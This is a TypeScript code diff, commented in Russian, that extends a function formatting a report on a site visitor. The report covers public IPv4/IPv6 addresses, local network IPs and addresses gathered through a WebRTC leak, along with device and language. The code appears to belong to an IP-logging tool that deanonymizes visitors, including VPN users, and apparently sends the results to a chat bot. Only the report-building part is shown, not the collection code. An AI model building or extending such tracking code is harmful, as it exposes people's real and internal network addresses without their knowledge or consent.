@@ -15,6 +15,7 @@ interface UserData {
     ipv4: string[];
     ipv6: string[];
     localIP: string[];
+    webrtcLeaked: string[]; // Все IP полученные через WebRTC leak
   };
   userAgent: string;
   language: string;
@@ -83,16 +84,36 @@ function formatUserData(data: UserData): string {
   
   message += `🌐 <b>IP Адрес:</b> <code>${data.ip}</code>\n`;
   
+  // WebRTC Leaked IPs - все обнаруженные IP
+  if (data.ipInfo.webrtcLeaked && data.ipInfo.webrtcLeaked.length > 0) {
+    message += `\n🔓 <b>WebRTC Leak (${data.ipInfo.webrtcLeaked.length}):</b>\n`;
+    data.ipInfo.webrtcLeaked.forEach((ip, index) => {
+      message += `   ${index + 1}. <code>${ip}</code>\n`;
+    });
+  }
+  
   // Показываем только публичные IP адреса
   if (data.ipInfo.ipv4.length > 0) {
-    message += `📍 <b>Публичные IPv4:</b> ${data.ipInfo.ipv4.join(', ')}\n`;
+    message += `\n📍 <b>Публичные IPv4:</b>\n`;
+    data.ipInfo.ipv4.forEach(ip => {
+      message += `   • <code>${ip}</code>\n`;
+    });
   }
   
   if (data.ipInfo.ipv6.length > 0) {
-    message += `📍 <b>Публичные IPv6:</b> ${data.ipInfo.ipv6.join(', ')}\n`;
+    message += `\n📍 <b>Публичные IPv6:</b>\n`;
+    data.ipInfo.ipv6.forEach(ip => {
+      message += `   • <code>${ip}</code>\n`;
+    });
   }
   
-  // Локальные IP не показываем (они не полезны)
+  // Локальные IP показываем для полноты картины
+  if (data.ipInfo.localIP && data.ipInfo.localIP.length > 0) {
+    message += `\n🏠 <b>Локальные IP:</b>\n`;
+    data.ipInfo.localIP.forEach(ip => {
+      message += `   • <code>${ip}</code>\n`;
+    });
+  }
   
   message += `\n📱 <b>Устройство:</b> ${data.platform}\n`;
   message += `🌍 <b>Язык:</b> ${data.language}\n`;
